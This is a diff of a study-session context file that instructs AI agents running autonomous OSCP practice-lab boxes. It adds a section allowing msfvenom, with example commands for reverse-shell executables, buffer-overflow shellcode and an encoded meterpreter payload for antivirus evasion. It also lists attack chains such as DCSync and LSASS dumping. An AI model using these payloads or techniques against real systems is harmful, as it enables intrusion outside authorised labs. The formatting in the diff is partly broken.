@@ -1,153 +1,299 @@
-# Codex Context — OSCP Study Session
-
-*Read this at the start of every session before doing anything. It covers who we are, the vault layout, the workflow, and the rules that matter.*
-
 ---
-
+tags: [oscp, codex, master-context]
+---
+tags: [oscp, codex, master-context]
+---
+# Codex Context — OSCP Study Session
+*Read this at the start of every session before doing anything. It covers who we are, the vault layout, the workflow, and the rules that matter.*
+---
 ## What We're Doing
-
 Studying for OSCP via Offsec modules + Hack The Box / Proving Grounds Practice boxes. Building a living Obsidian vault of notes, stage notes, and methodology docs as we go. The goal is exam-ready technique retention, not just flag collection.
-
 **Division of labour:**
-- **Claude** = strategy, methodology, module notes, planning, walk-through tutor
-- **Codex** = heavy lifting -- autonomous box runs, transcript generation, write-ups (from our transcript), hub doc updates, runbook gap-fills
+- **Codex** = autonomous box runs, transcript generation, heavy lifting, write-ups (from user's manual transcript), hub doc updates, runbook gap-fills
+- **Claude** = strategy, methodology, module notes, planning, walk-through tutor, final review
+---
+## MSFvenom Allowed (Always)
+**msfvenom is ALWAYS allowed. It is a payload generator, not an exploitation framework.**
+| Tool | Allowed? | Why |
+| :--- | :--- | :--- |
+| `msfvenom` | Yes (always) | Payload generator — like `ssh-keygen` or `openssl` |
+| `msfconsole` | Once per exam | Interactive exploitation framework — save for Windows privesc or tricky exploits |
+| `msfcli` | Once (deprecated) | Same as `msfconsole` |
+| `msfdb` | Yes | Database management for scan storage |
+### What `msfvenom` Is Used For
+- Generating reverse shell payloads (Windows/Linux/other)
+- Encoding payloads for specific constraints (Unicode, ASCII, buffer size)
+- Creating staged vs stageless payloads
+- Generating shellcode for manual exploits (like AChat buffer overflow)
+### Examples of Allowed Usage
+```bash
+# Windows reverse shell — stageless
+msfvenom -p windows/shell_reverse_tcp LHOST=$LocalIP LPORT=$Port -f exe -o shell.exe
+# Linux reverse shell
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=$LocalIP LPORT=$Port -f elf -o shell.elf
+# Unicode-safe shellcode for buffer overflow
+msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp \
+  LHOST=$LocalIP LPORT=$Port \
+  -e x86/unicode_mixed BufferRegister=EAX -f python
+# Encoded payload for AV evasion (if AV is actually present)
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$LocalIP LPORT=$Port \
+  -e x64/xor_dynamic -i 3 -f exe -o shell.exe
+
+### What `msfvenom` Does NOT Do
+
+- Does NOT exploit anything
+    
+- Does NOT interact with the target
+    
+- Does NOT provide a shell on its own
+    
+- Does NOT bypass authentication
+    
+- Does NOT run post-exploitation modules
+    
+
+**It is a file generator. Use it freely.**
 
 ---
 
 ## Vault Location
 
-```
+text
+
 /home/kali/Documents/Obsidian/main-vault/OSCP/
-```
 
 ### Folder Map
 
-| Folder | What's in it |
+|Folder|What's in it|
 |---|---|
-| `BOXES/WRITE UPS/AD/` | AD box write-ups (e.g. `Forest.md`, `Sauna.md`, `Return.md`) |
-| `BOXES/WRITE UPS/Windows/` | Standalone Windows write-ups |
-| `BOXES/WRITE UPS/Linux/` | Linux write-ups (unnumbered, e.g. `clamAV.md`, `Dawn2.md`) |
-| `BOXES/MASTER BOX LIST.md` | Master tracking list -- check off completed boxes here |
-| `BOXES/BOX LOGS/` | Raw terminal logs copied after each box |
-| `RUNBOOK V2/` | **Primary methodology reference** -- GPS-style runbook, 70+ stages |
-| `RUNBOOK/` | Old runbook -- do not touch this folder |
-| `MODULES/` | Per-module notes (M01–M28 etc.) |
-| `COMMAND APPENDIX/` | Command reference by topic area |
-| `DECISION TREE/` | "I found X, what do I try" decision trees by topic |
-| `COMMAND BREAKDOWNS/` | Flag-by-flag command explanations |
-| `METHODOLOGY CHEAT SHEET/` | High-level attack methodology by OS |
-| `MODERN TOOLING/` | Per-tool install, usage, RUNBOOK links, module links |
-| `REFERENCE CARDS/` | Process templates, box checklist, FAQ, OSCP habits |
-| `CHALLENGE LABS/` | CL4–CL6 overview and chain notes |
-| `OSCP COMMAND MASTER CHEATSHEET.md` | Single-file quick-reference for exam use |
-
----
-
-## Box Run Workflow (Codex Role)
-
-### Phase 1 — Autonomous run
-
-When given a box to run:
-
-1. **Read RUNBOOK V2 first.** Start at `RUNBOOK V2/Start Here.md` (Step 1), then `Port Triage.md` (Step 2). Follow the arrows. Use it as a methodology checklist, not a rigid script. Note any techniques not covered for later gap-filling.
-
-2. **You may search for public write-ups** for this box (ippsec.rocks, HTB forums, community walkthroughs) to inform your approach. This is allowed and encouraged for unfamiliar techniques. Document that you used one.
-
-3. **Full chain** -- recon → foothold → privesc → both flags confirmed.
-
-4. **No Metasploit whatsoever.** Not for initial exploitation, not for privesc, not for anything. No sqlmap either.
-
-5. **Never output flag values, credentials, or hashes** -- not in transcripts, not in reports, not anywhere. Say "flag confirmed at path" and nothing more.
-
-6. **Full transcript when done** -- every exact command, every exact output, in sequence. No collapsing, no summarising, no omitting steps. Claude follows this transcript command-for-command during the manual run. Send this before cleanup.
-
-7. **Sudo credentials.** You may request sudo credentials from the user if needed for a step. State clearly which box you need them for. Use them only for that box. When the box is complete, explicitly state: "I no longer need sudo credentials for [BoxName]." Do not retain or reuse them for any other box.
-
-8. **Transfer ALL analyzed artifacts to $BoxDir/loot/ before handing over.** Any binary, script, config, or file that Codex downloads, analyzes, or generates during the autonomous run must be copied to the shared box loot directory on Kali before the transcript is sent. This means:
-   - Downloaded target binaries (e.g. `dawn.exe`, `dawn-BETA.exe`)
-   - Any exploit scripts written during the run
-   - Any DLL or library files analyzed for gadgets
-   - Any config files read from the target
-   - Anything referenced in the transcript that Claude or the user would need to reproduce the analysis
-   If a file cannot be transferred (e.g. target-side-only file), say so explicitly in the transcript and give the path so the user can fetch it during the manual run.
-   **Why:** Write-ups document what the USER does during the manual run -- not what Codex did. If the binary isn't on disk, the user cannot verify gadgets, offsets, or parameters themselves, and the write-up ends up with "Codex found..." language instead of showing the actual methodology. Seen in: Dawn2 (2026-09-02) -- dawn-BETA.exe not transferred, stage 2 analysis could not be independently verified.
-
-9. **Single-shot service rule (updated 2026-09-02).** If a box has fragile single-shot services (services that crash and do not restart after one connection):
-   - Do NOT burn repeated reverts trying to fix operational issues
-   - The moment you have confirmed parameters (offset, gadget, bad chars) from a first successful foothold, transfer all artifacts and hand over to Claude + user for the manual run
-   - Do NOT re-attempt if the shell is lost due to socket closure, listener timing, or probe-consumed service
-   - In the transcript, mark the hand-over point clearly with: "HAND OVER: single-shot service -- parameters confirmed, manual run recommended"
-   - Claude + user will complete the chain manually from the confirmed parameters
-   Seen in: Dawn2 (2026-09-02) -- 6+ reverts due to single-shot TCP services on 1985 and 1435.
-
-10. **Clean-down -- ALL files, verified.** Remove everything you created, downloaded, uploaded, or staged -- on the target AND on Kali. This includes:
-   - All files in the box working directory on Kali (loot, www, tools staged for transfer)
-   - All webshells, reverse shell payloads, exploit scripts uploaded to the target
-   - All /tmp artifacts on the target
-   - Any accounts you created
-   - Any persistence you added
-   - The shadow copy if you created one
-   - Verify each removal individually -- do not assume deletion succeeded
-
-### Phase 2 — Write-up (after our manual run)
-
-**Codex does not write the write-up from his own autonomous run.**
-
-The write-up is written by Codex only after Claude passes the user's manual run transcript. The source for all write-up content is what the user did during their manual session -- commands, output, order of steps, tools used.
-
-When Claude sends the write-up brief:
-- Read it in full before starting
-- Base all walkthrough sections on the transcript Claude provides
-- Match the style of `Sauna.md` exactly (for AD boxes) or the relevant existing write-up for other types
-- See the Write-up Format section below
+|`BOXES/WRITE UPS/AD/`|AD box write-ups (e.g. `Forest.md`, `Sauna.md`, `Return.md`)|
+|`BOXES/WRITE UPS/Windows/`|Standalone Windows write-ups|
+|`BOXES/WRITE UPS/Linux/`|Linux write-ups (unnumbered, e.g. `clamAV.md`, `Dawn2.md`)|
+|`BOXES/MASTER BOX LIST.md`|Master tracking list — check off completed boxes here|
+|`BOXES/BOX LOGS/`|Raw terminal logs copied after each box|
+|`RUNBOOK V2/`|**Primary methodology reference** — GPS-style runbook, 70+ stages|
+|`RUNBOOK/`|Old runbook — do NOT touch this folder|
+|`MODULES/`|Per-module notes (M01–M28 etc.)|
+|`COMMAND APPENDIX/`|Command reference by topic area|
+|`DECISION TREE/`|"I found X, what do I try" decision trees by topic|
+|`COMMAND BREAKDOWNS/`|Flag-by-flag command explanations|
+|`METHODOLOGY CHEAT SHEET/`|High-level attack methodology by OS|
+|`MODERN TOOLING/`|Per-tool install, usage, RUNBOOK links, module links|
+|`REFERENCE CARDS/`|Process templates, box checklist, FAQ, OSCP habits|
+|`CHALLENGE LABS/`|CL4–CL6 overview and chain notes|
+|`OSCP COMMAND MASTER CHEATSHEET.md`|Single-file quick-reference for exam use|
 
 ---
 
 ## Variable and Tooling Rules
 
-**Use the Kali box tooling -- never create your own variables.**
+**Use the Kali box tooling — never create your own variables.**
 
 The user's Kali environment has helper commands. Use them:
 
-| Command | What it does |
+|Command|What it does|
 |---|---|
-| `boxstart BoxName IP htb` | Initialises the box -- creates directories, sets all variables, starts logging |
-| `boxset VAR value` | Sets and saves a variable to `.env` |
-| `loot cred user pass` | Saves a credential to `loot/creds.txt` |
-| `loot hash user hash` | Saves a hash to `loot/hashes.txt` |
-| `loot flag user\|root value` | Saves a flag to `loot/flags.txt` |
-| `loot key /path/to/key` | Copies an SSH key to loot/ |
-| `loot file /path/to/file` | Copies a file to loot/ |
-| `shot name` | Takes a screenshot to screenshots/ |
-| `boxdone` | Clears the current-box marker |
+|`boxstart BoxName IP htb`|Initialises the box — creates directories, sets all variables, starts logging|
+|`boxset VAR value`|Sets and saves a variable to `.env`|
+|`loot cred user pass`|Saves a credential to `loot/creds.txt`|
+|`loot hash user hash`|Saves a hash to `loot/hashes.txt`|
+|`loot flag user\|root value`|Saves a flag to `loot/flags.txt`|
+|`loot key /path/to/key`|Copies an SSH key to loot/|
+|`loot file /path/to/file`|Copies a file to loot/|
+|`shot name`|Takes a screenshot to screenshots/|
+|`boxdone`|Clears the current-box marker|
 
-**Variable names -- always use these:**
+**Variable names — always use these:**
 
-| Variable | Meaning |
+|Variable|Meaning|
 |---|---|
-| `$BoxIP` | Target IP |
-| `$BoxName` | Target hostname |
-| `$LocalIP` | Attacker IP (tun0) |
-| `$BoxDir` | Box working directory |
-| `$Domain` | AD domain FQDN |
-| `$FQDN` | Full hostname (host.domain.local) |
-| `$Username` | First credential username |
-| `$Password` | First credential password |
-| `$Username2` | Second username |
-| `$Password2` | Second password |
-| `$Username3` | Third username |
-| `$Password3` | Third password |
-| `$AdminUser` | Privileged account username |
-| `$AdminHash` | Privileged account NTLM hash |
-| `$Port` | Listener port |
-| `$WebPort` | Target web port |
-| `$Wordlist` | Active wordlist path |
+|`$BoxIP`|Target IP|
+|`$BoxName`|Target hostname|
+|`$LocalIP`|Attacker IP (tun0)|
+|`$BoxDir`|Box working directory|
+|`$Domain`|AD domain FQDN|
+|`$FQDN`|Full hostname (host.domain.local)|
+|`$Username`|First credential username|
+|`$Password`|First credential password|
+|`$Username2`|Second username|
+|`$Password2`|Second password|
+|`$Username3`|Third username|
+|`$Password3`|Third password|
+|`$AdminUser`|Privileged account username|
+|`$AdminHash`|Privileged account NTLM hash|
+|`$Port`|Listener port|
+|`$WebPort`|Target web port|
+|`$Wordlist`|Active wordlist path|
 
-**Never use:** `<username>`, `<target>`, `USER`, hardcoded IPs, or `export VAR=value` style. Never run `mkdir -p` manually -- `boxstart` creates the directory structure.
+**Never use:** `<username>`, `<target>`, `USER`, hardcoded IPs, or `export VAR=value` style. Never run `mkdir -p` manually — `boxstart` creates the directory structure.
 
 **Reference pages (read these):**
+
 - Pre-Engagement Kali Setup: `/home/kali/Documents/Obsidian/main-vault/OSCP/METHODOLOGY CHEAT SHEET/Pre-Engagement Kali Setup.md`
+    
 - OSCP Habits (screenshot and loot workflow): `/home/kali/Documents/Obsidian/main-vault/OSCP/REFERENCE CARDS/OSCP Habits.md`
+    
+
+---
+
+## Codex — Autonomous Run Phase
+
+### Workspace
+
+bash
+
+mkdir -p /tmp/$BoxName/{nmap,loot,exploits,www,screenshots}
+cd /tmp/$BoxName
+
+All logs, scans, scripts, and loot go here. **Nothing touches `~/Platforms/` until the manual run.**
+
+### What Codex Captures
+
+Codex must capture **everything** in the transcript:
+
+|What|Format|
+|---|---|
+|Every command run|`$ command`|
+|Every output returned|Full terminal output, no truncation|
+|Every error encountered|Full error message, no summarising|
+|Every file created|Path and contents (if small) or hash + path (if large)|
+|Every file downloaded/analysed|Path and hash, transferred to `loot/`|
+|Every exploit attempted|Full command + output + failure reason|
+|Every gotcha hit|Description + how it was resolved (or not)|
+|Every RUNBOOK V2 stage used|Step number + page name|
+|Every efficiency improvement noticed|Description of faster alternative|
+|Every technique NOT in RUNBOOK V2|Description + suggested new page/arrow|
+
+### When Codex Gets Stuck
+
+1. Document everything attempted
+    
+2. Document why each attempt failed
+    
+3. Mark the hand-off point clearly:
+    
+    text
+    
+
+[HAND OVER: stuck at X after trying A, B, C — manual intervention required]
+
+1. Transfer all artifacts to `loot/`
+    
+2. Send the full transcript to Claude
+    
+
+### When Codex Completes the Box
+
+1. Verify cleanup complete (target + Kali temp)
+    
+2. Transfer all artifacts to `loot/`
+    
+3. Mark the hand-off point clearly:
+    
+    text
+    
+
+[HAND OVER: box complete — full transcript follows]
+
+1. Send the full transcript to Claude
+    
+2. **DO NOT write the write-up yet** — that comes after Claude's manual run
+    
+
+### Codex's Close-Out Script
+
+bash
+
+# After the transcript is sent:
+cd /tmp
+rm -rf /tmp/$BoxName/
+# Confirm: ls /tmp/$BoxName/ returns "No such file or directory"
+
+### Single-Shot Service Rule
+
+If a box has fragile single-shot services (services that crash and do not restart after one connection):
+
+- Do NOT burn repeated reverts trying to fix operational issues
+    
+- The moment parameters (offset, gadget, bad chars) are confirmed, transfer all artifacts and hand over to Claude + user for the manual run
+    
+- Do NOT re-attempt if the shell is lost due to socket closure, listener timing, or probe-consumed service
+    
+- In the transcript, mark the hand-over point clearly with:
+    
+    text
+    
+
+[HAND OVER: single-shot service — parameters confirmed, manual run recommended]
+
+### Sudo Credentials
+
+You may request sudo credentials from the user if needed for a step. State clearly which box you need them for. Use them only for that box. When the box is complete, explicitly state:
+
+text
+
+"I no longer need sudo credentials for [BoxName]."
+
+Do not retain or reuse them for any other box.
+
+---
+
+## Claude — Tutor Phase
+
+Claude receives the full transcript from Codex and acts as the **tutor**, not the driver.
+
+### What Claude Does
+
+|Step|Action|
+|---|---|
+|1|Review the transcript|
+|2|Identify key moments|
+|3|Explain the "why" for each major step|
+|4|Flag what to screenshot and with what colours|
+|5|Point to Obsidian notes|
+|6|Identify knowledge gaps|
+|7|Plan the manual run — ONE step at a time|
+
+### Claude's Output Format
+
+text
+
+TUTOR REVIEW — [BoxName]
+Summary: 2-3 sentence overview of what Codex did
+Key Steps:
+1. [Step 1] — why this mattered, what it achieved
+2. [Step 2] — why this mattered, what it achieved
+...
+Screenshot Guidance:
+- Step 3: `shot nmap-allports` — highlight the AChat ports in RED, version in GREEN
+- Step 7: `shot msfvenom-shellcode` — highlight BufferRegister=EAX in RED
+...
+What to Check in Obsidian:
+- [[RUNBOOK V2/Windows - Remote - AChat Buffer Overflow]] — this technique is covered there
+- [[Module 13 - Locating Public Exploits]] — the searchsploit workflow is here
+- [[FAQ - Quick Answers.md#Buffer Overflow Debugging]] — common gotchas
+Knowledge Gaps Found:
+- No RUNBOOK V2 page for ACL privilege escalation — needs adding
+- No COMMAND BREAKDOWN for `icacls /grant /remove` — needs adding
+Next Steps (Manual Run):
+[One step at a time, exactly as designed]
+
+### Claude's Manual Run Role
+
+1. **One step at a time** — never dump all steps upfront
+    
+2. **Explain before commands** — why we're doing this
+    
+3. **Include expected output + failure indicators**
+    
+4. **Prompt for screenshots** — with colour guidance
+    
+5. **Prompt for loot** — `loot cred`, `loot hash`, `loot flag`
+    
+6. **Refer back to Obsidian notes** — reinforce the methodology
+    
+7. **Flag knowledge gaps** — add them to the "Knowledge Gaps Found" list
+    
 
 ---
 
@@ -156,36 +302,66 @@ The user's Kali environment has helper commands. Use them:
 **Style reference:** `OSCP/BOXES/WRITE UPS/Windows/Jerry.md` is the master blueprint for all write-ups. Match it exactly. For AD boxes, also reference `OSCP/BOXES/WRITE UPS/AD/Sauna.md` for AD-specific section structure (BloodHound, ACL enumeration, DCSync etc.), but the prose style, inline resources, and tutorial feel come from Jerry.md.
 
 - YAML frontmatter (tags, platform, os, hostname, domain, difficulty, ip, status)
-- `# HTB: BoxName, Full Walkthrough` -- H1 title
-- `## The gist` -- 2-3 sentence plain English kill chain
-- `## Box information` -- table (Platform, OS, Hostname, Domain, Difficulty, IP)
-- `## Variables` -- boxset commands
+    
+- `# HTB: BoxName, Full Walkthrough` — H1 title
+    
+- `## The gist` — 2-3 sentence plain English kill chain
+    
+- `## Box information` — table (Platform, OS, Hostname, Domain, Difficulty, IP)
+    
+- `## Variables` — boxset commands
+    
 - Numbered walkthrough sections with:
-  - **Tutorial prose per step, not summarised at the end.** Every numbered section opens with 2-4 sentences explaining the concept *before* the code block. The reader must understand why they are running the command before they see it. Do not collect explanations into Key Lessons and leave the walkthrough thin -- the walkthrough IS the tutorial.
-  - Explain *why* each tool or flag is used, not just *what* it does. If a flag appears in a command, its purpose is named in the prose above it.
-  - Where one approach was chosen over another (e.g. text API vs HTML manager), explain why.
-  - Code blocks using `$Variable` conventions
-  - `![[screenshot-name.png]]` on its own line, then `SCREENSHOT: caption` on the next line
-  - When describing what to highlight in a screenshot, use this colour convention: **Red = key finding** (port, version, credential, shell prompt, flag path) · **Green = context** (why it matters) · **Yellow = secondary finding** · **Purple = additional context** (rare). Most screenshots only need red + green.
-  - `💡` gotcha callouts inline at the relevant step
-  - `⚡` efficiency callouts inline at the relevant step -- name what alternative was avoided and why the chosen path is faster
-- `## RUNBOOK V2 Stages Used` -- wikilinked list of every V2 stage touched during the box
-- `## Attack Chain` -- numbered steps: what you did and what it gave you (no flags, no literal creds)
-- `## Credentials` table (Account / Source / Use -- no passwords or hashes)
-- `## Flags` -- `user.txt` / `root.txt` / `proof.txt` placeholder lines only, no values
-- `## Key lessons` -- 2-3 bullets: what this box taught that a future box could re-use
-- `## Related Boxes` -- wikilinks to boxes with similar techniques
+    
+    - **Tutorial prose per step, not summarised at the end.** Every numbered section opens with 2-4 sentences explaining the concept _before_ the code block. The reader must understand why they are running the command before they see it. Do not collect explanations into Key Lessons and leave the walkthrough thin — the walkthrough IS the tutorial.
+        
+    - Explain _why_ each tool or flag is used, not just _what_ it does. If a flag appears in a command, its purpose is named in the prose above it.
+        
+    - Where one approach was chosen over another (e.g. text API vs HTML manager), explain why.
+        
+    - Code blocks using `$Variable` conventions
+        
+    - `![[screenshot-name.png]]` on its own line, then `SCREENSHOT: caption` on the next line
+        
+    - When describing what to highlight in a screenshot, use this colour convention: **Red = key finding** (port, version, credential, shell prompt, flag path) · **Green = context** (why it matters) · **Yellow = secondary finding** · **Purple = additional context** (rare). Most screenshots only need red + green.
+        
+    - `💡` gotcha callouts inline at the relevant step
+        
+    - `⚡` efficiency callouts inline at the relevant step — name what alternative was avoided and why the chosen path is faster
+        
+- `## RUNBOOK V2 Stages Used` — wikilinked list of every V2 stage touched during the box
+    
+- `## Attack Chain` — numbered steps: what you did and what it gave you (no flags, no literal creds)
+    
+- `## Credentials` table (Account / Source / Use — no passwords or hashes)
+    
+- `## Flags` — `user.txt` / `root.txt` / `proof.txt` placeholder lines only, no values
+    
+- `## Key lessons` — 2-3 bullets: what this box taught that a future box could re-use
+    
+- `## Related Boxes` — wikilinks to boxes with similar techniques
+    
 - `## External Resources` (verified deep-links, technique-specific not homepages)
+    
 - `## Checklist` with `- [x]` boxes per completed step
+    
 
 **Hard rules for all vault writing:**
+
 - No flag values, no passwords, no hashes anywhere in any file
-- $Variable conventions throughout -- never hardcode box-specific values
+    
+- $Variable conventions throughout — never hardcode box-specific values
+    
 - No em dashes
+    
 - Read every file in full before editing
-- Add only -- never remove existing content
+    
+- Add only — never remove existing content
+    
 - Jargon explained in the same sentence it appears
-- Report what was added and where -- do not paste full files back
+    
+- Report what was added and where — do not paste full files back
+    
 
 ---
 
@@ -193,102 +369,69 @@ The user's Kali environment has helper commands. Use them:
 
 Run this after every box is completed and written up. This prevents drift so no mass cleanup session is ever needed.
 
-**1. Write-up compliance** -- every write-up must have all sections listed in Write-Up Format above. Check before closing the box.
+**1. Write-up compliance** — every write-up must have all sections listed in Write-Up Format above. Check before closing the box.
 
-**2. Cheatsheet update** -- open `OSCP COMMAND MASTER CHEATSHEET.md`. For every command used in the box that isn't already there, add it to the correct section with a one-line comment. `$Variable` format only. No MSF/sqlmap.
+**2. Cheatsheet update** — open `OSCP COMMAND MASTER CHEATSHEET.md`. For every command used in the box that isn't already there, add it to the correct section with a one-line comment. `$Variable` format only. No MSF/sqlmap.
 
-**3. RUNBOOK V2 Seen In update** -- for every stage used during the box, open that stage's file and add the box to the `## Seen in` section if not already there. Format: `- OSCP/BOXES/WRITE UPS/Platform/BoxName|BoxName -- one-line technique description`
+**3. RUNBOOK V2 Seen In update** — for every stage used during the box, open that stage's file and add the box to the `## Seen in` section if not already there. Format: `- OSCP/BOXES/WRITE UPS/Platform/BoxName|BoxName -- one-line technique description`
 
-**4. Tone check** -- re-read the write-up once before reporting done:
-   - No em dashes anywhere (use -- instead)
-   - No generic Why text (`"This command block performs..."`) in any V2 stage you edited
-   - Every routing bullet has a specific command or UI step, not a vague instruction
-   - No `<angle-bracket>` placeholders -- only `$Variable` format
-   - No jargon left unexplained in the same sentence it appears
+**4. Tone check** — re-read the write-up once before reporting done:
 
-**5. Master Box List** -- mark the box ✅ (or ♻️ if redo flagged) in `BOXES/MASTER BOX LIST.md`
+- No em dashes anywhere (use -- instead)
+    
+- No generic Why text (`"This command block performs..."`) in any V2 stage you edited
+    
+- Every routing bullet has a specific command or UI step, not a vague instruction
+    
+- No `<angle-bracket>` placeholders — only `$Variable` format
+    
+- No jargon left unexplained in the same sentence it appears
+    
 
----
-
-## Hub Doc and Runbook Edits
-
-When editing Command Appendix / Decision Tree / Breakdowns / RUNBOOK V2 files:
-1. Read the full file first -- match surrounding heading levels and style
-2. Use `$Username`, `$BoxIP` etc. -- never `<username>` or hardcoded values
-3. After editing, confirm the section heading and line number inserted -- do not paste the full file back
-4. Do NOT touch `/home/kali/Documents/Obsidian/main-vault/OSCP/RUNBOOK/` -- that is the old runbook, leave it alone
-5. RUNBOOK V2 edits: one decision per page, every arrow references a step number and wikilink, new pages follow the established format
-6. Every `## What did you get?` routing bullet must state the exact command or exact UI path -- never a vague instruction like "check the exploit" or "confirm identity" without showing how
-
----
-
-## Current Progress
-
-### HTB AD Boxes
-| Box | Status | Key Technique |
-|---|---|---|
-| Forest | ✅ | AS-REP roasting → Account Operators → WriteDACL → DCSync → PTH |
-| Sauna | ✅ | AS-REP roasting → Winlogon autologon → direct DCSync → PTH |
-| Return | ✅ | LDAP passback → Server Operators → VSS service hijack |
-| Flight | ✅ ♻️ | LFI UNC bypass → NTLM theft → RunasCs → GodPotato → VSS NTDS (REDO: NTDS exfil incomplete) |
-| Blackfield | ✅ | SMB null → AS-REP (support) → ForceChangePassword → LSASS dump → Backup Operators → DiskShadow → secretsdump → PTH |
-
-### HTB Windows Boxes
-| Box | Status | Key Technique |
-|---|---|---|
-| MarkUp | ✅ ♻️ | XXE → SSH key → scheduled task writable script → SYSTEM (REDO: skipped methodology) |
-| Jerry | ✅ | Tomcat default creds → Manager WAR deploy → JSP shell → SYSTEM |
-| Netmon | ✅ | Anonymous FTP → PRTG config .old.bak → year-incremented cred → CVE-2018-9276 notification injection → SYSTEM |
-| Servmon | ✅ | Anonymous FTP → NVMS-1000 dir traversal → SSH spray → NSClient++ SSH tunnel → API script execute → SYSTEM |
-| Chatterbox | ✅ | AChat UDP buffer overflow EDB-36025 → shell → inherited Full Control on Admin Desktop |
-
-### PG Practice Linux Boxes
-| # | Box | Technique | Status |
-|---|---|---|---|
-| 1 | clamAV | SNMP → Sendmail RCE → direct root | ✅ |
-| 2 | Pelican | Exhibitor UI injection → sudo gcore memory dump | ✅ |
-| 3 | Payday | CS-Cart LFI → SSH brute → sudo su | ✅ |
-| 4 | Snookums | LFI → data:// wrapper RCE → /etc/passwd write | ✅ |
-| 5 | Bratarina | OpenSMTPD CVE-2020-7247 → direct root | ✅ |
-| 6 | Pebbles | ZoneMinder SQLi → MySQL UDF | ✅ ♻️ |
-| 7 | Nibbles (PG) | PostgreSQL default creds → COPY TO PROGRAM → SUID find | ✅ |
-| 8 | Zenphoto | Zenphoto EDB-18083 → RDS kernel LPE | ✅ |
-| 9 | Nukem | Simple File List upload → DOSBox SUID → sudoers | ✅ |
-| 10 | Cockpit | SQLi auth bypass → tar wildcard sudo injection | ✅ |
-
-### HTB Linux Boxes
-| Box | Status | Key Technique |
-|---|---|---|
-| Sea | ✅ | WonderCMS blind XSS → module upload → log_file injection |
-
-### REDO Flags
-- **Flight** -- NTDS extraction step used stale files; redo with fresh vssadmin shadow copy → secretsdump
-- **Pebbles** -- UDF privesc not done manually (left /tmp/rootbash); redo manual UDF chain
-- **MarkUp** -- skipped methodology steps during write-up; redo with proper RUNBOOK workflow
+**5. Master Box List** — mark the box ✅ (or ♻️ if redo flagged) in `BOXES/MASTER BOX LIST.md`
 
 ---
 
 ## Key Constraints (Non-Negotiable)
 
-1. **No Metasploit whatsoever** -- not for exploitation, not for privesc, not for anything, it is only to be considered as a last resort, if all manual attempts have been exhausted
-2. **No sqlmap** -- manual injection only
-3. **Never output flag values, credentials, or hashes** -- keep all loot private
-4. **Use the Kali tooling** -- boxstart, boxset, loot, shot -- never create your own variable system
-5. **Follow RUNBOOK V2** -- it is the methodology reference
-6. **Read before editing** -- always read a file fully before making changes
-7. **Add only** -- never remove existing vault content
-8. **Write-ups from our transcript** -- not from your autonomous run
-9. **All artifacts to loot/** -- every binary, script, or file analyzed during the autonomous run must be in $BoxDir/loot/ before handover; if it isn't there, the user cannot verify it and the write-up will say "Codex found..." instead of showing methodology
-10. **Single-shot services** -- hand over immediately once parameters are confirmed; do not burn reverts trying to stabilise fragile services
-11. **When  you complete a box** -- You must send the full transcript and any in-sandbox analysis to claude before collapsing. Once transcript sent clear down the Box directory 
+1. **No Metasploit exploitation framework (`msfconsole`, `msfcli`) except as a last resort** — one use per exam, save for Windows privesc or tricky exploits
+    
+2. **`msfvenom` is ALWAYS allowed** — it's a payload generator, not an exploitation framework. Use it freely for shells, shellcode, and encoders.
+    
+3. **No sqlmap** — manual injection only
+    
+4. **No automated enumeration-to-root scripts** — manual step-by-step only
+    
+5. **Never output flag values, credentials, or hashes** — keep all loot private
+    
+6. **Use the Kali tooling** — boxstart, boxset, loot, shot — never create your own variable system
+    
+7. **Follow RUNBOOK V2** — it is the methodology reference
+    
+8. **Read before editing** — always read a file fully before making changes
+    
+9. **Add only** — never remove existing vault content
+    
+10. **Write-ups from our transcript** — not from your autonomous run
+    
+11. **All artifacts to loot/** — every binary, script, or file analyzed during the autonomous run must be in `$BoxDir/loot/` before handover
+    
+12. **Single-shot services** — hand over immediately once parameters are confirmed; do not burn reverts trying to stabilise fragile services
+    
 
 ---
 
 ## External Resources (Use These, Not Random Sites)
 
-- GTFOBins: https://gtfobins.github.io
-- RevShells: https://www.revshells.com
-- HackTricks: https://book.hacktricks.xyz
-- PayloadsAllTheThings: https://github.com/swisskyrepo/PayloadsAllTheThings
-- CyberChef: https://gchq.github.io/CyberChef/
-- ippsec.rocks: https://ippsec.rocks
+- GTFOBins: [https://gtfobins.github.io](https://gtfobins.github.io)
+    
+- RevShells: [https://www.revshells.com](https://www.revshells.com)
+    
+- HackTricks (GitHub): [https://github.com/HackTricks-wiki/hacktricks](https://github.com/HackTricks-wiki/hacktricks)
+    
+- PayloadsAllTheThings: [https://github.com/swisskyrepo/PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
+    
+- CyberChef: [https://gchq.github.io/CyberChef/](https://gchq.github.io/CyberChef/)
+    
+- [ippsec.rocks](https://ippsec.rocks): [https://ippsec.rocks](https://ippsec.rocks)  
+    EOF
